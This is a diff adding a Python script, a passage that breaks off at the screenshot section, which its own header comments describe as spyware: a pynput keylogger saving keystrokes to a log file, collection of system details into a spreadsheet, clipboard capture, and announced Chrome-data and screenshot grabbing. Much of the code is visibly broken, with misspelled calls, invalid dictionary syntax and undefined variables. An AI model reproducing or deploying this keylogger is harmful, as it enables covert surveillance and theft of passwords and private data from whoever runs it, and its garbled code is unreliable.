@@ -1,0 +1,62 @@
+#The program does the following tasks:
+#spying the keystrokes and storing in a file.
+#spying on computer info and storing it.
+#spying and storing the clipboard info.
+#spying the google chrome info and storing it.
+#Take a screenshot of the computer screen in png format.
+
+from pynput.keyboard import Key, Listener
+import datetime
+import sqlite3
+import socket
+import platform
+from requests import get #This function gets info about a website accessed.
+import win32clipboard
+from PIL import ImageGrab #This is for the screenshots.
+import pandas as pd #Allows manipulation with the acquired data.
+
+d = []
+def  on_press(key):
+    d.append(key)
+    write_file(d)
+    print(d)
+
+#The below block of code writes the data to a text file
+def write_file(var):
+    with open("logs.txt","a") as f :
+        for P in var:
+            new_var=stri(P).replace("'""")
+            f.write(new_var)
+            f.write('')
+#function that quits/stops the recording
+def on_release(key):
+    if key==key.esc:
+        return False
+
+#The listener function
+with Listener (on_press=on_press,on_release=on_release) as listener:
+    listener.join()
+
+#To get the computer info and to store it in a file:
+date=datetime.date.today()
+ip_address=socket.gethostbyname()
+#This creates a dataframe with comp. info.
+data = {
+    'Metric':['Date','Processor','IP address' ,'system','Release','Host Name']
+    'Value' : date,processor,ip_address,system,release,host_name
+
+}
+df= pd.DataFrame(data)
+#This saves the data to a well structured file
+df.to_excel('keystroke.xlsx',index=False)
+
+#To get the clipboard info and keep it in a file
+def copy_clipboard():
+    current_date=current_date.datetime.now()
+    with open("clipboard.txt","a") as f:
+        win32clipboard.OpenClipboard()
+        pasted_data=win32clipboard.GetClipboardData()
+        win32clipboard.CloseClipboard() #This gets the data in the clipboards & saves it.
+copy_clipboard()
+
+#To get the screensho
